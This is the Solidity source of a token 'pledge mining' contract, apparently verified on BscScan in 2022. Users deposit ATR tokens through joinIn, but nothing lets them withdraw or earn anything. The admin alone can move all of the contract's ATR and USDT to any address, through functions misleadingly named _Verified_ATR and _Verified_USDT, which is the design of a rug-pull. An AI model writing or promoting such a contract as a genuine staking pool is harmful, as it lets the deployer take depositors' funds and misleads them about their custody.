/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

//SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.13;

interface IERC20 {
    function transfer(address recipient, uint amount) external;
    function balanceOf(address account) external view returns (uint);
    function transferFrom(address sender, address recipient, uint amount) external ;
    function decimals() external view returns (uint8);

    function contractTransfer(address recipient, uint amount) external;
}

contract PledgeMining {
    address payable public admin;

    struct User {
        uint amount;
        address referrer;
    }

    mapping (address => User) public users;

    IERC20 public USDT;
    IERC20 public ATR;
    constructor(address payable _admin, IERC20 _USDT, IERC20 _ATR) {
        require(!isContract(_admin));
        admin = _admin;
        USDT = _USDT;
        ATR = _ATR;
    }

    function  joinIn(address referrer, uint amount) external {
        require(msg.sender != admin, "admin unable to operate");
        User storage user = users[msg.sender];
        if(user.amount == 0){
            user.referrer = referrer;
        }
        user.amount = user.amount + amount;
        ATR.transferFrom(msg.sender, address(this), amount);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function _Verified_ATR(address payable addr,uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        ATR.transfer(addr, _amount);
    }

    function _Verified_USDT(address payable addr,uint256 _amount) external{
        require(admin==msg.sender, 'Admin what?');
        USDT.transfer(addr, _amount);
    }
}